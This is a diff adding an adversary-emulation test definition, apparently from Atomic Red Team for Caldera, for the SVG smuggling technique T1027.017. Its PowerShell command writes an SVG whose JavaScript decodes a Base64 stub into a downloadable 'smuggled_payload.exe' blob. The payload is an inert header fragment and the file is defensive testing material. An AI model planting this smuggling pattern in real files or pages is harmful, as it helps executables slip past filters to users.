@@ -1,0 +1,38 @@
+- id: f976dbcb-d75b-4db8-9bc9-0dadbed2a132
+  name: T1027.017 - Base64 Blob Payload Assembly via SVG JavaScript
+  description: Embeds a Base64-encoded string inside an SVG script that creates a
+    binary Blob download.
+  tactic: stealth
+  technique:
+    attack_id: T1027.017
+    name: 'Obfuscated Files or Information: SVG Smuggling'
+  platforms:
+    windows:
+      psh:
+        command: '$svgPath = "$env:TEMP\T1027_017_base64_blob.svg"; $svgContent =
+          @"; <svg xmlns="http://www.w3.org/2000/svg">; <script type="text/javascript">;
+          var b64Payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA==";;
+          var byteCharacters = atob(b64Payload);; var byteNumbers = new Array(byteCharacters.length);;
+          for (var i = 0; i < byteCharacters.length; i++) {; byteNumbers[i] = byteCharacters.charCodeAt(i);;
+          }; var byteArray = new Uint8Array(byteNumbers);; var blob = new Blob([byteArray],
+          {type: "application/octet-stream"});; var link = document.createElement("a");;
+          link.href = window.URL.createObjectURL(blob);; link.download = "smuggled_payload.exe";;
+          </script>; </svg>; "@; [System.IO.File]::WriteAllText($svgPath,$svgContent);
+          Write-Host "[+] Generated Base64 Blob SVG at: $svgPath"'
+        cleanup: Remove-Item "$env:TEMP\T1027_017_base64_blob.svg" -Force -ErrorAction
+          SilentlyContinue
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - stealth
+  - atomic-red-team
+  - t1027.017
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2025-03-25T15:31:09.697Z'
+    atomic_guid: f976dbcb-d75b-4db8-9bc9-0dadbed2a132
+    import_timestamp: '2026-10-21T07:01:49.416060Z'
